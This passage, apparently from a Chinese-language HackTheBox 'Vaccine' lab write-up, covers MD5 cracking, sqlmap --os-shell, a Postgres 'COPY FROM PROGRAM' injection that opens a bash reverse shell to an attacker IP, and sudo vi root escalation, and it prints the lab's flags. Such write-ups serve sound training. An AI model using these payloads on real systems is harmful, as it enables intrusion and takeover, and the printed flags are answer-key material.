+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# unzip backup.zip 
+</span></span><span class="line"><span class="cl">Archive:  backup.zip
+</span></span><span class="line"><span class="cl"><span class="o">[</span>backup.zip<span class="o">]</span> index.php password: 
+</span></span><span class="line"><span class="cl">  inflating: index.php               
+</span></span><span class="line"><span class="cl">  inflating: style.css               
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat index.php
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">session_start<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">])</span> <span class="o">&amp;&amp;</span> isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> md5<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">])</span> <span class="o">===</span> <span class="s2">&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;login&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;true&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      header<span class="o">(</span><span class="s2">&#34;Location: dashboard.php&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>省略...<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可知用户名为 admin，密码 md5 哈希为 <code>2cb42f8734ea607eefed3b70af13bbd3</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s2">&#34;2cb42f8734ea607eefed3b70af13bbd3&#34;</span> &gt; md5.hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john --format<span class="o">=</span>raw-md5 --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt md5.hash   
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Warning: no OpenMP support <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">4</span>
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">qwerty789        <span class="o">(</span>?<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2026-11-03 02:13<span class="o">)</span> 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimo
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解出密码为 <code>qwerty789</code></p>
+<p><strong>答案：qwerty789</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>What option can be passed to sqlmap to try to get command execution via the sql injection?</p>
+<p>可以通过传递什么选项给 sqlmap 来尝试通过 SQL 注入获取命令执行权限？</p>
+</blockquote>
+<p>通过 admin:qwerty789 登录进去。</p>
+<p><img src="/p/10.-vaccine/assets/image-20261103151643821.png"
+	width="2137"
+	height="1003"
+	srcset="/p/10.-vaccine/assets/image-20261103151643821_hu3044928762038237474.png 480w, /p/10.-vaccine/assets/image-20261103151643821_hu15297109454915012564.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261103151643821"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="213"
+		data-flex-basis="511px"
+	
+></p>
+<p>只有一个 search 功能，输入一个 1，可以发现是 GET 请求。</p>
+<p><img src="/p/10.-vaccine/assets/image-20261103151749163.png"
+	width="587"
+	height="269"
+	srcset="/p/10.-vaccine/assets/image-20261103151749163_hu6319385033330577288.png 480w, /p/10.-vaccine/assets/image-20261103151749163_hu2121870996231455072.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261103151749163"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="523px"
+	
+></p>
+<p>通过 sqlmap 进行 SQL 注入的测试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# sqlmap -u <span class="s2">&#34;http://10.129.94.134/dashboard.php?search=1&#34;</span> --cookie<span class="o">=</span><span class="s2">&#34;PHPSESSID=ds9jgrbjtqv1v4gcoqc8dtm3u2&#34;</span> --os-shell
+</span></span><span class="line"><span class="cl">        ___
+</span></span><span class="line"><span class="cl">       __H__
+</span></span><span class="line"><span class="cl"> ___ ___<span class="o">[</span>,<span class="o">]</span>_____ ___ ___  <span class="o">{</span>1.10.6#stable<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ -<span class="p">|</span> . <span class="o">[</span><span class="s2">&#34;]     | .&#39;| . |
+</span></span></span><span class="line"><span class="cl"><span class="s2">|___|_  [&#39;]_|_|_|__,|  _|
+</span></span></span><span class="line"><span class="cl"><span class="s2">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">[*] starting @ 02:20:05 /2026-11-03/
+</span></span></span><span class="line"><span class="cl"><span class="s2">。。。。。。省略
+</span></span></span><span class="line"><span class="cl"><span class="s2">sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+</span></span></span><span class="line"><span class="cl"><span class="s2">---
+</span></span></span><span class="line"><span class="cl"><span class="s2">Parameter: search (GET)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Type: stacked queries
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Payload: search=1&#39;;SELECT PG_SLEEP(5)--
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Type: UNION query
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Title: Generic UNION query (NULL) - 5 columns
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Payload: search=1&#39; UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(112)||CHR(113))||(CHR(98)||CHR(76)||CHR(89)||CHR(116)||CHR(82)||CHR(66)||CHR(112)||CHR(120)||CHR(112)||CHR(119)||CHR(99)||CHR(117)||CHR(65)||CHR(87)||CHR(90)||CHR(87)||CHR(80)||CHR(80)||CHR(78)||CHR(84)||CHR(102)||CHR(86)||CHR(80)||CHR(111)||CHR(77)||CHR(107)||CHR(88)||CHR(86)||CHR(116)||CHR(105)||CHR(112)||CHR(75)||CHR(65)||CHR(97)||CHR(87)||CHR(114)||CHR(90)||CHR(83)||CHR(89)||CHR(105))||(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))-- Cgys
+</span></span></span><span class="line"><span class="cl"><span class="s2">---
+</span></span></span><span class="line"><span class="cl"><span class="s2">[02:21:47] [INFO] the back-end DBMS is PostgreSQL
+</span></span></span><span class="line"><span class="cl"><span class="s2">web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
+</span></span></span><span class="line"><span class="cl"><span class="s2">web application technology: Apache 2.4.41
+</span></span></span><span class="line"><span class="cl"><span class="s2">back-end DBMS: PostgreSQL
+</span></span></span><span class="line"><span class="cl"><span class="s2">[02:21:51] [INFO] fingerprinting the back-end DBMS operating system
+</span></span></span><span class="line"><span class="cl"><span class="s2">[02:21:54] [INFO] the back-end DBMS operating system is Linux
+</span></span></span><span class="line"><span class="cl"><span class="s2">[02:21:55] [INFO] testing if current user is DBA
+</span></span></span><span class="line"><span class="cl"><span class="s2">[02:21:58] [INFO] going to use &#39;COPY ... FROM PROGRAM ...&#39; command execution
+</span></span></span><span class="line"><span class="cl"><span class="s2">[02:21:58] [INFO] calling Linux OS shell. To quit type &#39;x&#39; or &#39;q&#39; and press ENTER
+</span></span></span><span class="line"><span class="cl"><span class="s2">os-shell&gt; id
+</span></span></span><span class="line"><span class="cl"><span class="s2">do you want to retrieve the command standard output? [Y/n/a] Y
+</span></span></span><span class="line"><span class="cl"><span class="s2">command standard output: &#39;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">os-shell&gt; 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>-u</code> 指定 URL，sqlmap 会自动解析其中的参数并进行 SQL 注入测试；</p>
+<p><code>--cookie</code> 指定 Cookie；<code>--os-shell</code> 获取交互式系统命令 shell。</p>
+<p><strong>答案：&ndash;os-shell</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>What program can the postgres user run as root using sudo?</p>
+<p>postgres 用户可以使用 sudo 以 root 用户身份运行什么程序？</p>
+</blockquote>
+<p>需要使用 <code>sudo -l</code> 命令进行查看。</p>
+<p>由于 sqlmap &ndash;os-shell 底层是通过写 Web 目录的木马脚本执行命令，交互与回显不稳定，这里也确实执行不了 <code>sudo -l</code>。</p>
+<p>所以我们反弹真实 shell 到攻击机上：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">// kali
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// sqlmap
+</span></span><span class="line"><span class="cl">os-shell&gt; bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.102/1234 0&gt;&amp;1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span> you want to retrieve the <span class="nb">command</span> standard output? <span class="o">[</span>Y/n/a<span class="o">]</span> Y
+</span></span><span class="line"><span class="cl"><span class="o">[</span>02:25:01<span class="o">]</span> <span class="o">[</span>CRITICAL<span class="o">]</span> unable to connect to the target URL. sqlmap is going to retry the request<span class="o">(</span>s<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>02:25:02<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> turning off pre-connect mechanism because of connection reset<span class="o">(</span>s<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>02:25:02<span class="o">]</span> <span class="o">[</span>CRITICAL<span class="o">]</span> connection reset to the target URL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>是可以成功反弹 shell 的，但是秒断。这是因为反弹成功后，父进程直接结束，连带把 shell 也杀掉了。</p>
+<p>另一种思路是建一张临时表，然后用 Postgres 的 <code>copy ... from program</code> 命令，使得数据库本身去执行 <code>from program</code> 后面的系统命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1<span class="s1">&#39;;create table cmd_exec(cmd_output text);--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="p">;</span>copy cmd_exec from program <span class="s1">&#39;/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.102/1234 0&gt;&amp;1&#34;&#39;</span>--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一条命令创建了一张 cmd_exec 表，其中只有一列 cmd_output，是文本类型。</p>
+<p>第二条命令，让 Postgres 执行系统命令反弹 shell，把命令输出读取出来放到刚才的表中。</p>
+<p>这样的好处是，postgres 数据库进程自己 fork 出来执行 bash ，父进程是后台一直运行的 postgres 服务，不是一次性 HTTP 请求，所以反弹连接不容易随请求销毁。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.102<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.94.134<span class="o">]</span> <span class="m">45350</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>2544<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">postgres@vaccine:/var/lib/postgresql/11/main$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>111<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>117<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span>postgres<span class="o">)</span>,116<span class="o">(</span>ssl-cert<span class="o">)</span>
+</span></span><span class="line"><span class="cl">postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">&lt;in$ python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> postgres: 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功拿到了 shell，但是还是执行不了 <code>sudo -l </code>，因为没有 postgres 的密码。</p>
+<p>去 Web 目录下找一下连接数据库的代码，其中应该有数据库密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">postgres@vaccine:/var/www$ <span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl">postgres@vaccine:/var/www/html$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">392</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root   <span class="m">4096</span> Jul <span class="m">23</span>  <span class="m">2021</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root   <span class="m">4096</span> Jul <span class="m">23</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root root <span class="m">362847</span> Feb  <span class="m">3</span>  <span class="m">2020</span> bg.png
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">4723</span> Feb  <span class="m">3</span>  <span class="m">2020</span> dashboard.css
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root     <span class="m">50</span> Jan <span class="m">30</span>  <span class="m">2020</span> dashboard.js
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">2313</span> Feb  <span class="m">4</span>  <span class="m">2020</span> dashboard.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">2594</span> Feb  <span class="m">3</span>  <span class="m">2020</span> index.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">1100</span> Jan <span class="m">30</span>  <span class="m">2020</span> license.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">3274</span> Feb  <span class="m">3</span>  <span class="m">2020</span> style.css
+</span></span><span class="line"><span class="cl">postgres@vaccine:/var/www/html$ cat dashboard.php
+</span></span><span class="line"><span class="cl">cat dashboard.php
+</span></span><span class="line"><span class="cl">。。。省略。。。
+</span></span><span class="line"><span class="cl">        &lt;?php
+</span></span><span class="line"><span class="cl">        session_start<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;login&#39;</span><span class="o">]</span> !<span class="o">==</span> <span class="s2">&#34;true&#34;</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          header<span class="o">(</span><span class="s2">&#34;Location: index.php&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          die<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        try <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$conn</span> <span class="o">=</span> pg_connect<span class="o">(</span><span class="s2">&#34;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        catch <span class="o">(</span> exception <span class="nv">$e</span> <span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">echo</span> <span class="nv">$e</span>-&gt;getMessage<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">。。。省略。。。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可知密码为 <code>P@s5w0rd!</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh postgres@10.129.94.134
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">postgres@vaccine:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> postgres: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> postgres on vaccine:
+</span></span><span class="line"><span class="cl">    <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;XAPPLRESDIR XFILESEARCHPATH
+</span></span></span><span class="line"><span class="cl"><span class="s2">    XUSERFILESEARCHPATH&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, mail_badpass
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User postgres may run the following commands on vaccine:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：vi</strong></p>
+<h3 id="submit-user-flag">Submit User Flag
+</h3><blockquote>
+<p>Submit the flag located in the postgres user&rsquo;s home directory.</p>
+<p>提交位于 postgres 用户主目录中的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">postgres@vaccine:~$ cat user.txt
+</span></span><span class="line"><span class="cl">ec9b13ca4d6229cd5cc1e09980965bf7
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：ec9b13ca4d6229cd5cc1e09980965bf7</strong></p>
+<h3 id="submit-root-flag">Submit Root Flag
+</h3><blockquote>
+<p>Submit the flag located in root&rsquo;s home directory.</p>
+<p>提交位于 root 用户主目录中的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@vaccine:/var/lib/postgresql# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@vaccine:/var/lib/postgresql# <span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">root@vaccine:~# cat root.txt
+</span></span><span class="line"><span class="cl">dd6e058e814260bc70e9bbdef2715849
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/10.-vaccine/assets/image-20261103155050877.png"
+	width="902"
+	height="187"
+	srcset="/p/10.-vaccine/assets/image-20261103155050877_hu10645259670739567652.png 480w, /p/10.-vaccine/assets/image-20261103155050877_hu6959925476741083015.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261103155050877"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="482"
+		data-flex-basis="1157px"
+	
+></p>
+<p>这里使用 <code>:shell</code> 就可以提权到 root。这是 vi 启动子 shell 的命令，因为这里的 vi 是以 root 身份跑的，所以开出的子 shell 就是 root shell.</p>
+<p><strong>答案：dd6e058e814260bc70e9bbdef2715849</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
